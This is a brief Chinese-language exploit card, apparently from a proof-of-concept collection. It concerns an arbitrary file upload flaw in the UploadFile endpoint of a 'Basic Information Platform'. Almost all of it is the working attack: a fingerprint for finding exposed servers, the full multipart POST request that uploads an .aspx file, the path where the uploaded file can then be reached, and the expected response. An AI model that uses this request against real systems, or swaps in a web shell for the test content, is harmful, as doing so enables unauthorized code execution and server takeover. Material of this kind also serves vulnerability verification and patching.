# 基础信息平台UploadFile存在任意文件上传漏洞

- **系统**：基础信息平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/SystemManage/BaseProject"`
- **请求**：`POST /SystemManage/BaseProject/UploadFile HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=rwqnflza5hjg0bunbihx43ci`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySnhtXyWF…`　`Content-Length: 1578`

**请求体 / payload**
```
------WebKitFormBoundarySnhtXyWF1OLXjDOr
Content-Disposition: form-data; name="file";filename="yy.aspx"
123
------WebKitFormBoundarySnhtXyWF1OLXjDOr--
上传定位
/Content/images/projectImage/yy.aspx
```
- **预期**：200　|　—